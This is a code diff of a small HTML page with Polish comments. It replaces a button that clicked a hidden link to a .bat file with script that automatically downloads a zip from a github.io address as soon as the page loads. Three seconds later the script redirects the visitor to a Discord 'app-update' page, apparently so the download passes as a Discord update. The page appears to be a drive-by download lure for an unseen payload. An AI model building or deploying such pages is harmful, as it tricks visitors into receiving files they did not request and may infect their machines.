@@ -6,23 +6,29 @@
     <title>Download File</title>
 </head>
 <body>
-    <h1>Click the button to download your file</h1>
+    <h1>Your download will start shortly...</h1>
     
-    <!-- Przycisk do pobrania pliku -->
-    <button id="downloadButton">Download File</button>
-    
-    <!-- Link do pliku .bat (ukryty) -->
-    <a id="downloadLink" href="file.bat" download="file.bat" style="display:none;"></a>
-
-    <!-- Skrypt JavaScript do obsługi kliknięcia przycisku -->
+    <!-- Skrypt JavaScript do automatycznego rozpoczęcia pobierania pliku i przekierowania -->
     <script>
-        // Funkcja uruchamiająca pobieranie pliku
-        function downloadFile() {
-            document.getElementById('downloadLink').click();
+        // Funkcja do rozpoczęcia pobierania pliku
+        function startDownload() {
+            // Tworzymy link do pobierania
+            var link = document.createElement('a');
+            link.href = 'https://abolojakub.github.io/website/test.zip'; // Ścieżka do pliku do pobrania
+            link.download = 'test.zip'; // Ustawiamy nazwę pliku, który ma być pobrany
+            document.body.appendChild(link); // Dodajemy link do DOM
+            link.click(); // Symulujemy kliknięcie, aby rozpocząć pobieranie
+            document.body.removeChild(link); // Usuwamy link po kliknięciu
+
+            // Po 3 sekundach przekierowujemy na stronę Discord
+            setTimeout(function() {
+                window.location.href = 'https://discord.com/tags/app-update'; // Przekierowanie na stronę
+            }, 3000); // Czas oczekiwania (3 sekundy)
         }
 
-        // Po kliknięciu przycisku wywołaj funkcję downloadFile
-        document.getElementById('downloadButton').addEventListener('click', downloadFile);
+        // Uruchamiamy funkcję po załadowaniu strony
+        window.onload = startDownload;
     </script>
 </body>
 </html>
+
